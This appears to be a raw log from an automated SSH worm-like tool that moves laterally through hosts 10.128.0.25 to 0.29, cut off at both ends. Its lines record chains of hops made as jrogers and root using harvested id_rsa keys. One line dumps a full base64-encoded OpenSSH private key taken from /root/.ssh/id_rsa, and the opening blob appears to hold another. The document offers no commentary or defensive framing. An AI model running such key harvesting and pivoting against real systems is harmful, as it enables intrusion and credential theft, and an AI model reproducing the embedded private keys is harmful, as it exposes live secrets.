6T1YvYTc2dnFQVEZGc0VsRDNrYnBiODhPd1J6S25RcXJTaEE4Rlo3cFlqVVM2WE1BM3FyOTNYRnkKUFNnRXZKVzE0OW96OHZkczY2bzdDYWR3U1lhdzJQVk9vTlNEbjg3REdKMnBTNGI0Vm1RUmJrWEZCb3NsS2pONTlpZENHcAozWWZtMzRmNGV4OWUrK2FWT3phZ0V1R0pZalptS01adW91cnRkMEVRT1A3Nk44VFVFcWpva0dvUE42bHY0STBvbGtPbUcvCkw0dVFiMndZWVVXbTVEZldEOTZScmtlMG1BeklJczJkMmI4OWhuekdSVGxvaWZ2VlEwTUdxcy90NzB0NWQwUjFSZGpZL1QKalZLejFMQk5sUXU1REwwSy9zdHpGWkxySXM0NjhZVEs2R21HcWNzQ0F6eG1TMFp4amREYmx6b0dWejZIRURDQW9mWlBYcApqcUYwZXZOWS8yTDZjVzdpWEJPZFNyZ0R4dWdmWG5ZOVlPZXc1NXZ0L3U2a1h0V2tOUHh3VXc2OWljZHBBUzFZOUxUMVJZCjVhcWpONEd0UUNoQW1DeVNMejBxQWFUL2hsV01VdVlnMFVrZmFjTm9EU0xSWlVMSE5sQnRhSVNpWXUwSDZtVFdUaEFBQUEKd0QxR3kwU24xMGhNcjQvaFdxWjRoVFhNS2pUaTR2VmtsR1Z4QmxXdndhQjhhTE5pU25NRGgrZTI4N21VWXpkYStZeks1MAprL2JoakJOLzk2c25KTHN5SVQ1NVpiWDczYVJZdUR4ZHZyTXgzbEZJdGppMldScWFScGE1dWJ6V2VZYnFlU251YU5SMVpMCk5yZENOQkxjdGZ0UC9IZ3AveXQ0R1RpNW0ydGFhU0JnRFpsa3NDakN4ZTUyNVFQcGhGREp2eWRjQi9hWHZIVGhrdGQ0aFQKc1NGWDRUUm8xS2gxZDBCY3hrVGxzN3d4QUN2OVFMTHlyaEpyUDB1SWRsekl4cmhnQUFBTUVBOE42R2ZDUERuWnF6cUhYcwoyN082RmVKVEV6OWR2N0VOQlFYeHQ5US9UbHcvNnNXdTIwcmw4TXJhV1lwMXBmZ1RKdFVleU9DRnNkZTlpaDNhdktQRU1oCjJJTnkvbm51bEdjUHZJR0pUajlFSEYxYzJYdHBVNHVJbGQzVmIrUGZORzdvdUlSQUFpT1hjQ1FkYUQwNzQ4ZTd1SkJRNDQKVkhqNTBKUWRkV3d2WVU5QkxMMGNQSEVkMmFaTnJ4V0hkRFdYWW9QaThOd3dCZjRVNUt0WG45b0hsYzFXSjVKVWpzV21WWgpaajJob04yQzRNYnBOdGt1ZURWVURJTTN4Z3ZWK25BQUFBd1FEUUlJUzFtM0d6dW04bUVyZnhLRW54bUVyaUNaakg2eHlGClFHSzZZT1pHbS9qb1ZWVERscTh2RjQ3aW95NXVFc3RyYWxEZDF0bFYzWTFSaEYxYUFPaEdLK0RoUUpueFBMR1VnQ1h1UEUKNG1NSHcwS2Y2THc0Skh4OFIxZU9GZ0xxMkNVajlSbEMrOUl1ejc3c0lOUjMzanNWdUVSUC8zblFpYjA0bkt0MzgvL2hrSAp6dHNmZDQ2U1NLUjZmRmxQU3ppY0UzTGQvci94Mjhobno2S3FqdkdKRE5KdDM1bmE0STl4S3JVUkJFaDhIZzhsN0JPcXNqClJaTWhTUk41NDMzK2tBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMkFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020332]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: Discovered usable private key [3072 MD5:fa:24:e5:39:6e:ca:01:bd:9d:ba:4f:dc:39:32:a1:8c root@instance-6 (RSA)] in [/root/.ssh/id_rsa]\n[1704020332]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF4dllUdE81WGEvUDN4S0ZPRTFTY3JhbmhFZHhZTzFIbUE1bnNpNVdIbHBOSURhWU5WZDIvCndOWEw1QXB4Sm5sYjFBUitObUtGa1RPN3ZyUmZaVkZ0UW1TejVEMkl0K3dUanc0SUpQdjBVdEVzUHd6VzNSTlhZRGFrZkgKRDd1T1RXZGt2VlMyVEtnL2w1TCttRDZjMjkxaUNQaVZPUVV0UENjWEJPQ1dBNURKelpIWEh5VVpvcUsvSlkvSS9KR0lINgpDMUhrQzVxaTFISERiVXlYbjd5dzMxU3QvL0Mra3VVdHYxM0lHTU5WUlNST09HYXp2VnZlTFlnK0k2c0d2dlFWRjNUKzBTCnJYaC9JZWg1Vkw0eVNvWUhOVTYvbHBNbFZiV1VoaXhLUURJaTFTdkNwMUlJNXJEd01ickszeWxyb3U3bEV5a2IrUjR0alIKcjVHd1NIMkJ1TVNtMzlEM1U5WVhTVEtNZW1tOERsQjhsazkxL0lXWXBwckxvMjlINkM2N3NweEFuRHRwbHZtWFh0YUU4dwpYSFpKaVBwTlRuL2JWQ25USXlmY3hLK0hwQURZQStQRUxZNzB1RE1aSWtLSmVPaGY0SzhPNkRSaGxvTmFCQmVId1JORzJ4Cmw4QkY2WWppNU5WUUpjS0dMZlpOYjVDUEpDZkVnS0hQd01Bb0ZNNmpBQUFGaUxyK2N0YTYvbkxXQUFBQUIzTnphQzF5YzIKRUFBQUdCQU1iMkU3VHVWMnZ6OThTaFRoTlVuSzJwNFJIY1dEdFI1Z09aN0l1Vmg1YVRTQTJtRFZYZHY4RFZ5K1FLY1NaNQpXOVFFZmpaaWhaRXp1NzYwWDJWUmJVSmtzK1E5aUxmc0U0OE9DQ1Q3OUZMUkxEOE0xdDBUVjJBMnBIeHcrN2prMW5aTDFVCnRreW9QNWVTL3BnK25OdmRZZ2o0bFRrRkxUd25Gd1RnbGdPUXljMlIxeDhsR2FLaXZ5V1B5UHlSaUIrZ3RSNUF1YW90UngKdzIxTWw1KzhzTjlVcmYvd3ZwTGxMYjlkeUJqRFZVVWtUamhtczcxYjNpMklQaU9yQnI3MEZSZDAvdEVxMTRmeUhvZVZTKwpNa3FHQnpWT3Y1YVRKVlcxbElZc1NrQXlJdFVyd3FkU0NPYXc4REc2eXQ4cGE2THU1Uk1wRy9rZUxZMGErUnNFaDlnYmpFCnB0L1E5MVBXRjBreWpIcHB2QTVRZkpaUGRmeUZtS2FheTZOdlIrZ3V1N0tjUUp3N2FaYjVsMTdXaFBNRngyU1lqNlRVNS8KMjFRcDB5TW4zTVN2aDZRQTJBUGp4QzJPOUxnekdTSkNpWGpvWCtDdkR1ZzBZWmFEV2dRWGg4RVRSdHNaZkFSZW1JNHVUVgpVQ1hDaGkzMlRXK1FqeVFueElDaHo4REFLQlRPb3dBQUFBTUJBQUVBQUFHQkFKbEdTYmhCUlNmdE14dFFDUTNyU1NpZ2pyCnRydkswMlVyVERoKytncW12ZDJzeG8rQzBHUUFzV3FaUnNWdThFM3pGZXBMelErWVQ3RGMvRXRSa2d1Y05FUVRHOEZlOWEKOTFabHdQQjlDYVFqY0tyQ0FXVWUyVmxOdnpuKzhHMW9IYS9VaStVaEtNS3pGaUZMREV5NksxMGlpSEdLNXN4b1JvdU5zUgpDWUNGc25HandNNUZqcEkwUG4xNVg2VHptS0tFOUFMeWFoWW4rM2hJNVhTeGZNRFpaL2JleVdVcnBudys2QkdQMjZ2WjRlCmNnUVJXcmF1WjJNOGFtS2dCdnBrbmQ0ZWZTc1lGLzRlZjlmU1dpVFl2eFNWSVROWEN0ZWUxc0JHZGpNMXEraGRCZ21QZHcKY2R5VlJUbExEL212a1RMYm5FRmEvVnJ2Z3lUQTZqUTlzSjJaSHM4Rjg1Y3o0c2pIZTExbzNwVm5MUXRqU3ZueWZNbzc2ZApFMmc2ZHdXRkVPRW1oRi8yOWFhdWl2MWdGZEU0S1lkVm1keTMvd2I5aWdFSmZyVENKZjdHMHNJYUx6SlM0TDZGQTRSNmdrCm1JOFBlWWhDUkZaN0ZxWUl1ODUzTEhyQ256TkhrdG5MeHJUY2RZKy9MenF1endYR3VQU0RKRy9lWHBlSCtlSjVjM2dRQUEKQU1FQTBJTnFFZEhBWGNxNGhEa25mSGVPcVFYb1ZrMmFsS1VJcHRHVlplNnphSW92dHBDU1IzZUltVy9Icm9YZDFJQVZ5Vgpqck52NzlIdWl0R013NmNxODJVY1M5NmRUU3hEVFQ1QXc2TXVvVzVaQUswLzFWenM2TlFJZ0dselZPNU9ib0RXZEVhV1FrCitTdXEvOHZpMEQzakV0RGF1Q1ZjUUh5dTVaTGtMRTQxTk5oY05PN0hndjc3a2Z3TnZpdkN3ZHpMNGFLeldCMDBNVWp0N28KUjY0UnFvVFhWUmxXUHFUOWFVZ2lwNzVmWXNMSVFFVmtFc1kySjUydkdwejd1ZmFMakRBQUFBd1FEMU9Cemt2NGhEQmdscwpXeHVwQWk5NTMxOU14bXgzWk9tbm1aMWxrKzFQNlIyU0orUEt0QlBXL0FNTjFTWk5XVjlaNWQxcXVHMXVYc3U4N0RvenB3CkZzU2hvdXY5eXo1VXkwWlJkUVRZYTlXYXRkT3lld0s1L3RuSzhKTDVjNklEUVA0SDQzR1U1cmxFMzlnYmwxK2U3LzBtT3MKWVJ6djcvZVhhakJUcS92MFVtRDZCczUvckRtK3cwUGpVWkJHTG1DRVBSVUFYTTdSUld2Rm53MWxzRjNnMDJoaXJQVlgxbApudkxKcVMxQW1xaFRyRHNNbmY3Snlqa0k0MzI0Y2xJV3NBQUFEQkFNKzFWMWs1MktzN2hHdzVBSWNjVThIdFg3d3poaFpICjh2bnhCUmJNYmNZMjFHS21jWlN6N0pzUGNuekFVVlZhbkZKK1VjUUl6OFNWbGRMdHU5dzQySUdxY2JJSDl1NG1NMnI0STkKQ0JNTlZKMk1mMUF1N2ZYbkRka2E4bWJDclBxZUY5T05tVGFlcVg4VllVVW9VTU1rbEdyRGp3bHdQajlGZ21NeGY5WG5kcQpHdEtCbFZFVlAxUmNsd25LUWlyMnNmV0pWQkNRL3NhWVJBcnVrWDUvY2dLWmNTNXBrSWRGc0wxU1gwWXZyd00rRTdUSGlPClkxSnI1U3NhWDcvMkg5cVFBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRZQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020332]         jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020333]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020333]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020333]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020333]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020334]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020334]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020334]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020334]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020334]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020334]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020335]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020335]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020335]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020335]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020335]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020335]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020336]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020336]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020336]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020336]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020336]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020336]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020337]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020337]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020337]          jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020337]          jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020338]         